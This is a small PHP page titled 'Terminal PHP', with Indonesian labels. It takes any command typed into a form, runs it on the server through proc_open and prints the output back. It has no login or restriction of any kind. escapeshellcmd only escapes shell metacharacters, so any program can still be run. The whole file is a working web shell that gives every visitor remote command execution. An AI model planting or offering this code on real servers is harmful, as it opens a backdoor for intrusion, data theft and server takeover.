<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal PHP</title>
</head>
<body>
    <h1>Terminal PHP</h1>

    <form method="post" action="">
        <label for="command">Masukkan perintah:</label>
        <input type="text" id="command" name="command" required>
        <button type="submit">Jalankan</button>
    </form>

    <div id="outputContainer">
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $command = $_POST["command"];
            $command = escapeshellcmd($command);
            $descriptorspec = array(
                0 => array("pipe", "r"), 
                1 => array("pipe", "w"), 
                2 => array("pipe", "w")  
            );

            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                while ($s = fgets($pipes[1])) {
                    echo $s;
                    flush(); 
                }

                while ($s = fgets($pipes[2])) {
                    echo $s;
                    flush(); 
                }

                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        }
        ?>
    </div>
</body>
</html>
